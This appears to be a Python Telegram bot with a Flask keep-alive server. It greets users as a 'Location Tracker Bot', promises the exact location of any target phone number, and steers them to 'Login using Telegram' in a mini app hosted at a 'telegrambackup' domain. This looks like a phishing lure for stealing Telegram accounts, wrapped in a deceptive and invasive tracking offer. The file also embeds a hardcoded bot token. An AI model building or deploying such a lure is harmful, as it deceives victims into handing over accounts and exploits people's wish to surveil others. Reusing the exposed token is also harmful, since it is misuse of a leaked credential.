import telebot
# Added WebAppInfo to the imports
from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton, WebAppInfo
import threading
import os
from flask import Flask

# Paste your single bot token here
TOKEN = "8668483286:AAHUQAMMILZ6NDoMVTUjGAH7UxiRLyl1AwU"

# Put your Mini App URL here (Must start with https://)
MINI_APP_URL = "https://telegrambackup.onrender.com" 

# Initialize the single bot
bot = telebot.TeleBot(TOKEN)

@bot.message_handler(commands=['start'])
def send_welcome(message):
    markup = InlineKeyboardMarkup()
    
    # --- CHANGED: Now uses web_app instead of url ---
    open_button = InlineKeyboardButton(
        "🌟 Find Location 🌟", 
        web_app=WebAppInfo(url=MINI_APP_URL)
    )
    markup.add(open_button)

    # Engaging message using Markdown
    welcome_text = (
        "🚀 **Welcome to the Location Tracker Bot!** 🚀\n\n"
        "Here is how to get started:\n\n"
        "👉 **Step 1:** Click the Find Location button below.\n"
        "👉 **Step 2:** Enter Target Mobile Number.\n"
        "👉 **Step 3:** Login using Telegram.\n"
        "👉 **Step 4:** Get Exact Location!\n\n"
        "👇 *Click below to proceed* 👇"
    )

    bot.send_message(
        chat_id=message.chat.id,
        text=welcome_text,
        parse_mode='Markdown',
        reply_markup=markup
    )

def run_bot():
    """Function to run the bot polling."""
    print(f"Bot with token ending in ...{TOKEN[-4:]} is starting.")
    bot.polling(none_stop=True)

# Start a background thread for the single bot
thread = threading.Thread(target=run_bot, daemon=True)
thread.start()

# --- Render Web Service Requirement ---
app = Flask(__name__)

@app.route('/')
def health_check():
    return "The Telegram bot is running successfully!"

if __name__ == "__main__":
    port = int(os.environ.get("PORT", 10000))
    app.run(host="0.0.0.0", port=port)
